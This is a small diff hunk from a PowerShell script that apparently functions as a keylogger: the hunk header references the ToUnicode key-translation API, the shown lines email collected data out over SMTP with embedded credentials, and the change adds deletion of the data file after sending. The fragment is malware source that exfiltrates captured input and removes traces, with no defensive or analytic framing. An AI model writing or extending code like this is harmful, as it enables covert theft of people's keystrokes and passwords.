@@ -85,7 +85,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
     $smtp.EnableSSL = $true
     $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $Password);
     $smtp.Send($email, $emailto, $subject, $data);
-    
+    Remove-Item $path
     
   }
 }
